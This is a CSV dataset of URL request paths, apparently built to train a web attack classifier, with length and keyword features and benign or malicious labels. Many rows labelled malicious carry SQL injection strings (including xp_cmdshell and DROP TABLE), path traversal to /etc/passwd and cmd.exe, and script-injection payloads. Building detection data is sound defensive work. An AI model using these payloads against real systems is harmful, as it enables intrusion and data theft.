payload,label,length,special_chars,keywords
/products/item?sort=asc655,0,26,0,0
/about,0,6,0,0
/api/users?page=2279,0,20,0,0
/about?search=onload=prompt(1),1,30,2,0
/about,0,6,0,0
/contact?user=urmit732,0,22,0,0
/index.html?sort=asc957,0,23,0,0
/dashboard?user=urmit613,0,24,0,0
/api/users,0,10,0,0
/about?sort=asc792,0,18,0,0
/about?id=1408,0,14,0,0
/dashboard?search=admin' --,1,27,1,0
/checkout?page=2279,0,19,0,0
/login?id=1534,0,14,0,0
/products/item?id=1495,0,22,0,0
/about?id=1517,0,14,0,0
/login?user=urmit272,0,20,0,0
/about?sort=asc811,0,18,0,0
/products/item?id=1465,0,22,0,0
/checkout?id=1109,0,17,0,0
/checkout?search=' OR '1'='1,1,28,4,0
/api/users?category=tech812,0,27,0,0
/index.html?search=?id=1; DROP TABLE users,1,42,1,1
/index.html?id=180,0,18,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/about?page=2124,0,16,0,0
/api/users?category=tech947,0,27,0,0
/login?category=tech62,0,22,0,0
/index.html?id=1425,0,19,0,0
/checkout?category=tech27,0,25,0,0
/dashboard?search=javascript:eval('var a=1'),1,44,4,1
/onload=prompt(1),1,17,2,0
/contact?user=urmit333,0,22,0,0
/checkout?user=urmit962,0,23,0,0
/login?category=tech963,0,23,0,0
/products/item?page=2980,0,24,0,0
/?id=1; DROP TABLE users,1,24,1,1
/index.html?sort=asc475,0,23,0,0
/contact?page=2732,0,18,0,0
/about?search='; EXEC xp_cmdshell('dir');--,1,43,7,1
/products/item?search=../../../windows/system32/cmd.exe,1,55,0,0
/index.html?sort=asc63,0,22,0,0
/dashboard?user=urmit870,0,24,0,0
/api/users?id=1174,0,18,0,0
/about?search=' OR '1'='1,1,25,4,0
/about?id=1488,0,14,0,0
/dashboard?page=2161,0,20,0,0
/checkout?page=2129,0,19,0,0
/contact?id=118,0,15,0,0
/about?page=2335,0,16,0,0
/dashboard?sort=asc281,0,22,0,0
/products/item?sort=asc356,0,26,0,0
/login?search=' OR '1'='1,1,25,4,0
"/login?search="" OR 1=1 --",1,25,1,0
/products/item?id=1532,0,22,0,0
/checkout?user=urmit701,0,23,0,0
/contact?category=tech440,0,25,0,0
/index.html?sort=asc311,0,23,0,0
/products/item?search=' OR '1'='1,1,33,4,0
/api/users,0,10,0,0
/dashboard?category=tech939,0,27,0,0
/api/users?category=tech790,0,27,0,0
/login?id=1546,0,14,0,0
/dashboard?page=229,0,19,0,0
/dashboard?sort=asc722,0,22,0,0
/contact?category=tech924,0,25,0,0
/admin' --,1,10,1,0
/api/users?category=tech281,0,27,0,0
/products/item?user=urmit396,0,28,0,0
/about?search=?id=1; DROP TABLE users,1,37,1,1
/index.html?search=?id=1; DROP TABLE users,1,42,1,1
/contact,0,8,0,0
/contact,0,8,0,0
/checkout?page=2506,0,19,0,0
/../../../../etc/passwd,1,23,0,0
/products/item?search=../../../windows/system32/cmd.exe,1,55,0,0
/api/users,0,10,0,0
/products/item,0,14,0,0
/api/users?user=urmit869,0,24,0,0
/../../../../etc/passwd,1,23,0,0
/dashboard?sort=asc959,0,22,0,0
/checkout?id=1355,0,17,0,0
/about?user=urmit86,0,19,0,0
/about?user=urmit372,0,20,0,0
/checkout?category=tech788,0,26,0,0
/checkout?page=2770,0,19,0,0
/dashboard?category=tech463,0,27,0,0
/contact?sort=asc820,0,20,0,0
/index.html?search=?id=1; DROP TABLE users,1,42,1,1
/api/users?id=1769,0,18,0,0
/dashboard?id=1531,0,18,0,0
/products/item?category=tech430,0,31,0,0
/login?sort=asc696,0,18,0,0
/checkout?category=tech605,0,26,0,0
/dashboard?id=1134,0,18,0,0
/checkout?id=1903,0,17,0,0
/products/item?page=2403,0,24,0,0
/index.html,0,11,0,0
/products/item?user=urmit371,0,28,0,0
/about?page=2509,0,16,0,0
/products/item?sort=asc74,0,25,0,0
/checkout,0,9,0,0
/contact?category=tech775,0,25,0,0
/login?id=1373,0,14,0,0
/checkout?id=1972,0,17,0,0
/index.html?category=tech490,0,28,0,0
/contact?user=urmit617,0,22,0,0
/products/item?id=1894,0,22,0,0
/contact,0,8,0,0
/products/item?id=127,0,21,0,0
/api/users?category=tech268,0,27,0,0
/admin' --,1,10,1,0
/admin' --,1,10,1,0
/products/item?id=1329,0,22,0,0
/about?sort=asc475,0,18,0,0
/api/users?page=2878,0,20,0,0
/dashboard?id=1483,0,18,0,0
/contact?sort=asc613,0,20,0,0
/about?category=tech322,0,23,0,0
/dashboard?id=1157,0,18,0,0
"/"" OR 1=1 --",1,12,1,0
/checkout?category=tech386,0,26,0,0
/index.html,0,11,0,0
/login?category=tech512,0,23,0,0
/login?user=urmit340,0,20,0,0
/api/users?id=15,0,16,0,0
/api/users?category=tech391,0,27,0,0
/contact?page=2309,0,18,0,0
/login?sort=asc92,0,17,0,0
/dashboard?id=1219,0,18,0,0
/api/users?category=tech590,0,27,0,0
/about?sort=asc399,0,18,0,0
/checkout?user=urmit740,0,23,0,0
/dashboard?category=tech140,0,27,0,0
/checkout?sort=asc346,0,21,0,0
/dashboard?sort=asc333,0,22,0,0
/about?sort=asc977,0,18,0,0
/products/item?user=urmit397,0,28,0,0
/checkout?sort=asc474,0,21,0,0
/' OR '1'='1,1,12,4,0
/products/item,0,14,0,0
/api/users?category=tech146,0,27,0,0
/contact?sort=asc872,0,20,0,0
/login?id=1519,0,14,0,0
/checkout?category=tech154,0,26,0,0
/login?page=2317,0,16,0,0
/login?id=1398,0,14,0,0
/onload=prompt(1),1,17,2,0
/admin' --,1,10,1,0
/login?search='; EXEC xp_cmdshell('dir');--,1,43,7,1
/dashboard?sort=asc595,0,22,0,0
/products/item?page=2712,0,24,0,0
/checkout?search=?id=1; DROP TABLE users,1,40,1,1
/products/item?search=' OR '1'='1,1,33,4,0
/index.html?page=2409,0,21,0,0
/checkout?id=1974,0,17,0,0
/checkout?id=1333,0,17,0,0
/api/users?user=urmit245,0,24,0,0
/api/users?sort=asc864,0,22,0,0
/contact,0,8,0,0
/api/users?page=2370,0,20,0,0
/index.html?sort=asc199,0,23,0,0
/checkout?search=../../../windows/system32/cmd.exe,1,50,0,0
/products/item?sort=asc964,0,26,0,0
/dashboard?id=1179,0,18,0,0
/login?user=urmit109,0,20,0,0
/checkout?id=1243,0,17,0,0
/about?search='; EXEC xp_cmdshell('dir');--,1,43,7,1
/index.html?id=1701,0,19,0,0
/about?id=1451,0,14,0,0
/checkout?id=1955,0,17,0,0
/about?id=1212,0,14,0,0
/dashboard?page=2159,0,20,0,0
/about,0,6,0,0
/about?user=urmit795,0,20,0,0
/index.html?category=tech329,0,28,0,0
/dashboard?id=1571,0,18,0,0
/login,0,6,0,0
/admin' --,1,10,1,0
/dashboard?category=tech100,0,27,0,0
/contact,0,8,0,0
/login?page=258,0,15,0,0
/index.html,0,11,0,0
/dashboard,0,10,0,0
/api/users?sort=asc365,0,22,0,0
/about?page=2412,0,16,0,0
/about?page=2200,0,16,0,0
/dashboard?category=tech280,0,27,0,0
"/"" OR 1=1 --",1,12,1,0
/dashboard?category=tech549,0,27,0,0
/dashboard,0,10,0,0
/products/item,0,14,0,0
/login?sort=asc478,0,18,0,0
/api/users,0,10,0,0
/products/item?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,61,9,3
/checkout?page=2148,0,19,0,0
/api/users?user=urmit731,0,24,0,0
/about?sort=asc603,0,18,0,0
/index.html?page=2716,0,21,0,0
/checkout?sort=asc45,0,20,0,0
/products/item?user=urmit352,0,28,0,0
/login?id=182,0,13,0,0
/index.html?id=1527,0,19,0,0
/dashboard?sort=asc20,0,21,0,0
/' OR '1'='1,1,12,4,0
/products/item?sort=asc970,0,26,0,0
/contact,0,8,0,0
/api/users?sort=asc707,0,22,0,0
/checkout?page=287,0,18,0,0
/onload=prompt(1),1,17,2,0
/dashboard?page=2894,0,20,0,0
/checkout?id=1906,0,17,0,0
/login?category=tech881,0,23,0,0
/login?sort=asc675,0,18,0,0
/?id=1; DROP TABLE users,1,24,1,1
/contact?search=../../../../etc/passwd,1,38,0,0
/' OR '1'='1,1,12,4,0
/about?category=tech70,0,22,0,0
/index.html,0,11,0,0
/about?category=tech542,0,23,0,0
/index.html?search=admin' --,1,28,1,0
/index.html?sort=asc126,0,23,0,0
/api/users?user=urmit850,0,24,0,0
/dashboard?id=1452,0,18,0,0
/api/users?sort=asc844,0,22,0,0
/index.html,0,11,0,0
/login?page=2821,0,16,0,0
/checkout?sort=asc432,0,21,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/index.html?id=1221,0,19,0,0
/about?search=onload=prompt(1),1,30,2,0
/api/users?id=1405,0,18,0,0
/login?id=1505,0,14,0,0
/index.html?search=../../../../etc/passwd,1,41,0,0
/dashboard?id=1132,0,18,0,0
/contact?id=1754,0,16,0,0
/dashboard?user=urmit982,0,24,0,0
/contact?sort=asc727,0,20,0,0
/checkout?user=urmit49,0,22,0,0
/dashboard,0,10,0,0
/contact?page=2882,0,18,0,0
/login?sort=asc203,0,18,0,0
/contact?user=urmit737,0,22,0,0
/' OR '1'='1,1,12,4,0
/products/item?id=1822,0,22,0,0
/login?sort=asc460,0,18,0,0
/products/item?sort=asc996,0,26,0,0
/api/users?page=2158,0,20,0,0
/checkout?user=urmit108,0,23,0,0
/contact?page=2583,0,18,0,0
/api/users?id=1211,0,18,0,0
/products/item?category=tech657,0,31,0,0
"/about?search=UNION SELECT username, password FROM users",1,56,0,2
/contact?id=1174,0,16,0,0
/login?category=tech764,0,23,0,0
/contact,0,8,0,0
/contact?category=tech113,0,25,0,0
/products/item?sort=asc713,0,26,0,0
"/login?search="" OR 1=1 --",1,25,1,0
/contact?page=249,0,17,0,0
/dashboard?user=urmit471,0,24,0,0
/products/item,0,14,0,0
/about?search=onload=prompt(1),1,30,2,0
/about?id=1459,0,14,0,0
/<script>alert(document.cookie)</script>,1,40,6,3
/api/users?user=urmit251,0,24,0,0
/checkout?sort=asc503,0,21,0,0
"/"" OR 1=1 --",1,12,1,0
/../../../windows/system32/cmd.exe,1,34,0,0
/dashboard,0,10,0,0
/dashboard?id=1269,0,18,0,0
/index.html,0,11,0,0
/about,0,6,0,0
/dashboard?page=2627,0,20,0,0
/products/item?user=urmit243,0,28,0,0
/about?page=2638,0,16,0,0
/api/users?category=tech146,0,27,0,0
/checkout,0,9,0,0
/checkout?category=tech869,0,26,0,0
/index.html,0,11,0,0
/products/item?category=tech547,0,31,0,0
/contact?user=urmit995,0,22,0,0
/login?id=1920,0,14,0,0
/' OR '1'='1,1,12,4,0
/about?search=../../../windows/system32/cmd.exe,1,47,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/login?category=tech362,0,23,0,0
/contact?category=tech499,0,25,0,0
/index.html?page=2463,0,21,0,0
/checkout?page=2272,0,19,0,0
/api/users,0,10,0,0
/api/users,0,10,0,0
/api/users?page=2154,0,20,0,0
/about,0,6,0,0
/api/users,0,10,0,0
/products/item?sort=asc717,0,26,0,0
/dashboard?sort=asc580,0,22,0,0
/api/users?user=urmit909,0,24,0,0
/about?user=urmit469,0,20,0,0
/?id=1; DROP TABLE users,1,24,1,1
/products/item?sort=asc698,0,26,0,0
/dashboard?page=2806,0,20,0,0
/about?page=2457,0,16,0,0
/checkout?user=urmit520,0,23,0,0
/../../../../etc/passwd,1,23,0,0
/dashboard?user=urmit157,0,24,0,0
/products/item?sort=asc11,0,25,0,0
/index.html,0,11,0,0
/checkout?search=?id=1; DROP TABLE users,1,40,1,1
/dashboard?user=urmit108,0,24,0,0
/contact,0,8,0,0
/index.html?page=2637,0,21,0,0
/products/item?sort=asc855,0,26,0,0
/index.html,0,11,0,0
/api/users?category=tech774,0,27,0,0
/contact?id=1245,0,16,0,0
/?id=1; DROP TABLE users,1,24,1,1
/checkout?category=tech805,0,26,0,0
/about?sort=asc971,0,18,0,0
/products/item?id=1982,0,22,0,0
/contact?user=urmit198,0,22,0,0
/checkout?page=2881,0,19,0,0
/contact?user=urmit64,0,21,0,0
/index.html?id=12,0,17,0,0
/api/users?category=tech657,0,27,0,0
/api/users?page=2784,0,20,0,0
/api/users?sort=asc675,0,22,0,0
/api/users,0,10,0,0
/contact?category=tech832,0,25,0,0
/contact,0,8,0,0
/api/users?sort=asc794,0,22,0,0
/about?page=2798,0,16,0,0
/checkout?user=urmit998,0,23,0,0
/dashboard?category=tech772,0,27,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/index.html?category=tech688,0,28,0,0
/admin' --,1,10,1,0
/about?id=1109,0,14,0,0
/products/item,0,14,0,0
/login?search=admin' --,1,23,1,0
/api/users,0,10,0,0
/login?category=tech946,0,23,0,0
/contact?id=1511,0,16,0,0
/products/item?page=2109,0,24,0,0
/about,0,6,0,0
/contact?category=tech347,0,25,0,0
/contact?search=../../../../etc/passwd,1,38,0,0
/dashboard,0,10,0,0
"/api/users?search="" OR 1=1 --",1,29,1,0
/about?id=1904,0,14,0,0
/dashboard?id=1667,0,18,0,0
/login?id=1884,0,14,0,0
/api/users?page=2648,0,20,0,0
/dashboard?sort=asc548,0,22,0,0
/index.html?category=tech68,0,27,0,0
/checkout,0,9,0,0
/index.html?sort=asc33,0,22,0,0
/login?page=2880,0,16,0,0
/contact?id=1946,0,16,0,0
/dashboard?id=1395,0,18,0,0
/contact,0,8,0,0
/checkout?page=2803,0,19,0,0
/checkout,0,9,0,0
"/"" OR 1=1 --",1,12,1,0
/login?id=1864,0,14,0,0
/about?category=tech589,0,23,0,0
/index.html?page=2795,0,21,0,0
/dashboard?id=1621,0,18,0,0
"/UNION SELECT username, password FROM users",1,43,0,2
/dashboard?search=onload=prompt(1),1,34,2,0
/products/item,0,14,0,0
/dashboard?category=tech643,0,27,0,0
/about?category=tech769,0,23,0,0
/products/item?id=1305,0,22,0,0
/about?user=urmit393,0,20,0,0
/login?search=../../../windows/system32/cmd.exe,1,47,0,0
/api/users?id=1466,0,18,0,0
/api/users?user=urmit50,0,23,0,0
/dashboard?page=2645,0,20,0,0
/checkout?page=2307,0,19,0,0
/contact?page=2556,0,18,0,0
/dashboard?id=1270,0,18,0,0
/about?user=urmit958,0,20,0,0
/dashboard,0,10,0,0
/login?page=2664,0,16,0,0
/' OR '1'='1,1,12,4,0
/contact?user=urmit542,0,22,0,0
/index.html?category=tech932,0,28,0,0
/checkout?search=../../../windows/system32/cmd.exe,1,50,0,0
/index.html?id=1955,0,19,0,0
/products/item?category=tech726,0,31,0,0
/api/users?id=1472,0,18,0,0
/contact?category=tech318,0,25,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/checkout?sort=asc32,0,20,0,0
/api/users,0,10,0,0
/dashboard?category=tech621,0,27,0,0
/products/item?sort=asc329,0,26,0,0
/contact?page=2635,0,18,0,0
/dashboard?category=tech343,0,27,0,0
/products/item?page=2220,0,24,0,0
/api/users?category=tech873,0,27,0,0
/api/users?sort=asc332,0,22,0,0
"/dashboard?search="" OR 1=1 --",1,29,1,0
/contact?category=tech512,0,25,0,0
/contact?category=tech236,0,25,0,0
/contact?page=294,0,17,0,0
/dashboard?user=urmit118,0,24,0,0
/api/users?search=admin' --,1,27,1,0
/api/users?user=urmit924,0,24,0,0
/index.html?user=urmit952,0,25,0,0
/products/item?page=2660,0,24,0,0
"/index.html?search="" OR 1=1 --",1,30,1,0
/checkout?sort=asc413,0,21,0,0
/about,0,6,0,0
/admin' --,1,10,1,0
/contact?id=1758,0,16,0,0
/login,0,6,0,0
/about?sort=asc838,0,18,0,0
/products/item,0,14,0,0
/login?search=<script>alert(document.cookie)</script>,1,53,6,3
/api/users?user=urmit58,0,23,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/about?sort=asc2,0,16,0,0
/login?category=tech561,0,23,0,0
/contact?page=2671,0,18,0,0
/products/item?user=urmit727,0,28,0,0
/about?page=2769,0,16,0,0
/index.html?sort=asc495,0,23,0,0
/api/users?search=' OR '1'='1,1,29,4,0
/products/item,0,14,0,0
/login?sort=asc351,0,18,0,0
"/checkout?search=UNION SELECT username, password FROM users",1,59,0,2
/products/item?user=urmit399,0,28,0,0
/index.html?sort=asc753,0,23,0,0
/login?sort=asc331,0,18,0,0
/api/users?sort=asc590,0,22,0,0
/onload=prompt(1),1,17,2,0
/dashboard?category=tech847,0,27,0,0
/login?page=2426,0,16,0,0
/dashboard?id=1494,0,18,0,0
/products/item?sort=asc861,0,26,0,0
/login?page=274,0,15,0,0
/index.html?page=2652,0,21,0,0
/login?id=1626,0,14,0,0
/dashboard?sort=asc569,0,22,0,0
/contact?page=2798,0,18,0,0
/about?search=../../../../etc/passwd,1,36,0,0
/dashboard?sort=asc609,0,22,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/index.html?category=tech226,0,28,0,0
/index.html?search=admin' --,1,28,1,0
/index.html?category=tech833,0,28,0,0
/login?user=urmit98,0,19,0,0
"/products/item?search=UNION SELECT username, password FROM users",1,64,0,2
/about?category=tech177,0,23,0,0
/products/item,0,14,0,0
/products/item?user=urmit155,0,28,0,0
/products/item?category=tech929,0,31,0,0
/dashboard?page=2465,0,20,0,0
/about,0,6,0,0
/about?id=1715,0,14,0,0
/contact?search=' OR '1'='1,1,27,4,0
/index.html?user=urmit594,0,25,0,0
/api/users?sort=asc865,0,22,0,0
"/api/users?search="" OR 1=1 --",1,29,1,0
/dashboard?page=2698,0,20,0,0
/contact?category=tech346,0,25,0,0
/contact?search=?id=1; DROP TABLE users,1,39,1,1
/contact?sort=asc80,0,19,0,0
/about?sort=asc436,0,18,0,0
/onload=prompt(1),1,17,2,0
/checkout?category=tech269,0,26,0,0
/checkout?id=1193,0,17,0,0
/checkout?category=tech439,0,26,0,0
/api/users?id=1135,0,18,0,0
/index.html?id=1407,0,19,0,0
/login?category=tech210,0,23,0,0
/checkout?user=urmit576,0,23,0,0
/' OR '1'='1,1,12,4,0
/contact?user=urmit435,0,22,0,0
/index.html?user=urmit886,0,25,0,0
/about?id=1222,0,14,0,0
/index.html?category=tech979,0,28,0,0
/checkout?user=urmit193,0,23,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/contact?search=onload=prompt(1),1,32,2,0
/onload=prompt(1),1,17,2,0
/products/item?search=../../../windows/system32/cmd.exe,1,55,0,0
/products/item?sort=asc525,0,26,0,0
/api/users,0,10,0,0
/login?sort=asc729,0,18,0,0
/contact?user=urmit645,0,22,0,0
/products/item?sort=asc426,0,26,0,0
/checkout?search=onload=prompt(1),1,33,2,0
/dashboard?sort=asc147,0,22,0,0
/dashboard,0,10,0,0
/about,0,6,0,0
/?id=1; DROP TABLE users,1,24,1,1
/contact?page=2657,0,18,0,0
/api/users,0,10,0,0
/products/item?sort=asc409,0,26,0,0
/about?sort=asc766,0,18,0,0
/products/item,0,14,0,0
/checkout?page=2342,0,19,0,0
/contact?user=urmit453,0,22,0,0
/checkout?sort=asc23,0,20,0,0
/index.html?category=tech314,0,28,0,0
/products/item?page=2857,0,24,0,0
/index.html?id=1368,0,19,0,0
/index.html?id=1319,0,19,0,0
/api/users?category=tech463,0,27,0,0
/checkout?id=178,0,16,0,0
/dashboard?category=tech715,0,27,0,0
/checkout?category=tech806,0,26,0,0
/about,0,6,0,0
/contact?user=urmit169,0,22,0,0
/about?user=urmit90,0,19,0,0
/api/users,0,10,0,0
/products/item?sort=asc428,0,26,0,0
/admin' --,1,10,1,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/api/users?user=urmit862,0,24,0,0
/checkout?sort=asc393,0,21,0,0
/checkout?id=1598,0,17,0,0
/dashboard?user=urmit883,0,24,0,0
/contact?category=tech508,0,25,0,0
/contact?category=tech381,0,25,0,0
/api/users?user=urmit560,0,24,0,0
/about?id=1738,0,14,0,0
/about?search=admin' --,1,23,1,0
/login?category=tech126,0,23,0,0
/dashboard,0,10,0,0
/dashboard?user=urmit844,0,24,0,0
/onload=prompt(1),1,17,2,0
/api/users?id=1162,0,18,0,0
/login,0,6,0,0
/about?search=?id=1; DROP TABLE users,1,37,1,1
/' OR '1'='1,1,12,4,0
/contact?sort=asc234,0,20,0,0
/api/users?id=1813,0,18,0,0
/../../../../etc/passwd,1,23,0,0
/products/item?sort=asc774,0,26,0,0
/login?category=tech716,0,23,0,0
/login?search=javascript:eval('var a=1'),1,40,4,1
/checkout?user=urmit704,0,23,0,0
/dashboard?page=2717,0,20,0,0
/dashboard?category=tech201,0,27,0,0
/contact?sort=asc408,0,20,0,0
/index.html?category=tech908,0,28,0,0
/login?category=tech952,0,23,0,0
/login,0,6,0,0
/onload=prompt(1),1,17,2,0
/index.html?page=2493,0,21,0,0
/checkout?sort=asc936,0,21,0,0
/products/item?user=urmit707,0,28,0,0
/api/users?search=<script>alert(document.cookie)</script>,1,57,6,3
/products/item?sort=asc821,0,26,0,0
/products/item?sort=asc25,0,25,0,0
/contact?search=../../../../etc/passwd,1,38,0,0
/contact?category=tech102,0,25,0,0
/index.html?category=tech839,0,28,0,0
/about?id=196,0,13,0,0
/login?page=2838,0,16,0,0
/login?category=tech866,0,23,0,0
/dashboard,0,10,0,0
/checkout?page=2717,0,19,0,0
/products/item?page=2993,0,24,0,0
/dashboard?id=1712,0,18,0,0
/checkout?id=1130,0,17,0,0
/contact?user=urmit394,0,22,0,0
/api/users?sort=asc461,0,22,0,0
/onload=prompt(1),1,17,2,0
/contact?sort=asc538,0,20,0,0
/login?user=urmit394,0,20,0,0
/checkout?user=urmit165,0,23,0,0
/admin' --,1,10,1,0
/dashboard?page=2409,0,20,0,0
/index.html?sort=asc142,0,23,0,0
/dashboard?page=2496,0,20,0,0
/about?sort=asc947,0,18,0,0
/login?id=1263,0,14,0,0
/checkout,0,9,0,0
/api/users?search=../../../../etc/passwd,1,40,0,0
/api/users?search=?id=1; DROP TABLE users,1,41,1,1
/dashboard?page=2694,0,20,0,0
/api/users?user=urmit368,0,24,0,0
/' OR '1'='1,1,12,4,0
/index.html,0,11,0,0
/api/users?sort=asc425,0,22,0,0
/about?page=2279,0,16,0,0
/login,0,6,0,0
/login?user=urmit307,0,20,0,0
/index.html?sort=asc469,0,23,0,0
/contact?search=?id=1; DROP TABLE users,1,39,1,1
/checkout?category=tech475,0,26,0,0
/api/users?category=tech370,0,27,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/products/item?id=1631,0,22,0,0
/<script>alert(document.cookie)</script>,1,40,6,3
/onload=prompt(1),1,17,2,0
/login?id=1753,0,14,0,0
/checkout?page=2554,0,19,0,0
/dashboard?sort=asc656,0,22,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/index.html?user=urmit467,0,25,0,0
/products/item?sort=asc121,0,26,0,0
"/login?search=UNION SELECT username, password FROM users",1,56,0,2
/admin' --,1,10,1,0
/login,0,6,0,0
/about?sort=asc822,0,18,0,0
/login?page=2461,0,16,0,0
"/products/item?search=UNION SELECT username, password FROM users",1,64,0,2
/api/users?id=1492,0,18,0,0
/dashboard?page=2834,0,20,0,0
/contact?page=2884,0,18,0,0
/login?search=?id=1; DROP TABLE users,1,37,1,1
"/about?search="" OR 1=1 --",1,25,1,0
/products/item?user=urmit550,0,28,0,0
/checkout?search=../../../../etc/passwd,1,39,0,0
/?id=1; DROP TABLE users,1,24,1,1
/checkout?sort=asc807,0,21,0,0
/index.html?sort=asc392,0,23,0,0
/login?user=urmit73,0,19,0,0
/index.html?sort=asc912,0,23,0,0
/dashboard?sort=asc989,0,22,0,0
/dashboard?user=urmit90,0,23,0,0
"/"" OR 1=1 --",1,12,1,0
/products/item?page=2613,0,24,0,0
/checkout,0,9,0,0
/products/item,0,14,0,0
/checkout?id=1303,0,17,0,0
/login?id=1534,0,14,0,0
/dashboard,0,10,0,0
/dashboard?sort=asc700,0,22,0,0
/contact?category=tech931,0,25,0,0
/products/item?page=24,0,22,0,0
/../../../../etc/passwd,1,23,0,0
/contact?page=2884,0,18,0,0
/login?category=tech253,0,23,0,0
/login,0,6,0,0
/login?page=2386,0,16,0,0
/api/users?user=urmit101,0,24,0,0
/index.html?id=1121,0,19,0,0
/products/item?user=urmit456,0,28,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/dashboard?sort=asc794,0,22,0,0
/products/item?category=tech146,0,31,0,0
/../../../../etc/passwd,1,23,0,0
/contact?id=1819,0,16,0,0
/api/users?sort=asc933,0,22,0,0
/checkout,0,9,0,0
/dashboard?id=1862,0,18,0,0
/login?sort=asc648,0,18,0,0
/about,0,6,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/about?category=tech729,0,23,0,0
/index.html?search=../../../windows/system32/cmd.exe,1,52,0,0
/about?user=urmit719,0,20,0,0
/login?search=?id=1; DROP TABLE users,1,37,1,1
/products/item?search=../../../../etc/passwd,1,44,0,0
/api/users?user=urmit891,0,24,0,0
/login?user=urmit168,0,20,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/dashboard?user=urmit723,0,24,0,0
/products/item?user=urmit272,0,28,0,0
/index.html?sort=asc756,0,23,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/api/users?page=2953,0,20,0,0
/index.html?sort=asc310,0,23,0,0
/dashboard,0,10,0,0
/contact?sort=asc123,0,20,0,0
/contact?id=1329,0,16,0,0
/api/users?search=javascript:eval('var a=1'),1,44,4,1
/about,0,6,0,0
/login?page=2413,0,16,0,0
/about?category=tech67,0,22,0,0
/dashboard?id=14,0,16,0,0
/api/users,0,10,0,0
/checkout?page=2398,0,19,0,0
/products/item?id=1501,0,22,0,0
/products/item?user=urmit202,0,28,0,0
/products/item?page=2615,0,24,0,0
/index.html?category=tech29,0,27,0,0
/contact,0,8,0,0
/contact?sort=asc979,0,20,0,0
/dashboard?page=2572,0,20,0,0
/login?user=urmit671,0,20,0,0
/checkout?category=tech137,0,26,0,0
/about?sort=asc815,0,18,0,0
/contact,0,8,0,0
/contact?search=?id=1; DROP TABLE users,1,39,1,1
/login,0,6,0,0
/about?id=1854,0,14,0,0
"/about?search=UNION SELECT username, password FROM users",1,56,0,2
/login?id=1260,0,14,0,0
/products/item?id=1595,0,22,0,0
/login?page=2567,0,16,0,0
/checkout?id=1216,0,17,0,0
/about,0,6,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/onload=prompt(1),1,17,2,0
/../../../windows/system32/cmd.exe,1,34,0,0
/login,0,6,0,0
/api/users?page=2353,0,20,0,0
/about?id=1297,0,14,0,0
/index.html?user=urmit227,0,25,0,0
/checkout?page=2611,0,19,0,0
/index.html?search=onload=prompt(1),1,35,2,0
/login?page=2918,0,16,0,0
/onload=prompt(1),1,17,2,0
/contact?search=javascript:eval('var a=1'),1,42,4,1
/api/users?search=%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,57,9,3
/api/users,0,10,0,0
/products/item?page=2252,0,24,0,0
/index.html?sort=asc26,0,22,0,0
/contact?user=urmit52,0,21,0,0
/dashboard?sort=asc294,0,22,0,0
/about?page=2956,0,16,0,0
/index.html?sort=asc9,0,21,0,0
/index.html?user=urmit869,0,25,0,0
/checkout?search=../../../../etc/passwd,1,39,0,0
/login?search=javascript:eval('var a=1'),1,40,4,1
/api/users,0,10,0,0
/login?page=2777,0,16,0,0
/index.html,0,11,0,0
/products/item?search=?id=1; DROP TABLE users,1,45,1,1
/login?id=1703,0,14,0,0
/login?page=2481,0,16,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/products/item?user=urmit435,0,28,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/login?user=urmit931,0,20,0,0
/about?page=2301,0,16,0,0
/login?page=2781,0,16,0,0
/products/item?search=' OR '1'='1,1,33,4,0
